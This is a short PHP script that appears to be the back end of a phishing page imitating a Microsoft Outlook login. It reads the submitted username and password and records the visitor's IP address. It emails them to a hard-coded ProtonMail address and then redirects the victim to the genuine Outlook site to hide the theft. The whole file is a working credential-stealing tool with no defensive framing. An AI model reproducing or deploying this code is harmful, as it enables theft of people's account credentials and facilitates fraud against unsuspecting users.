<?php
/* Set e-mail recipient */
$email  = "freesea1010@protonmail.com";

 $ipadress = getenv("REMOTE_ADDR");
                





$uname = check_input($_POST['uname']);
$pass  = check_input($_POST['pass'], "Please enter a valid username and password");

if (!preg_match("/^(https?:\/\/+[\w\-]+\.[\w\-]+)/i", $website))
{
    $website = '';
}


$mess = "Hello!

login details:

User Name: $uname

Password: $pass

IP Address: $ipadress



";

/* Send the message using mail() function */
mail($email, $pass, $mess);

/* Redirect visitor to the thank you page */
header('Location: https://outlook.office.com/mail/');
exit();

/* Functions we used */
function check_input($data, $problem='')
{
    $data = trim($data);
    $data = stripslashes($data);

    $data = htmlspecialchars($data);
    if ($problem && strlen($data) == 0)
    {
        show_error($problem);
    }
    return $data;
}

function show_error($myError)
{
?>
    <html>
    <body>

    <b>Please correct the following error:</b><br />
    <?php echo $myError; ?>

    </body>
    </html>
<?php
exit();
}
?>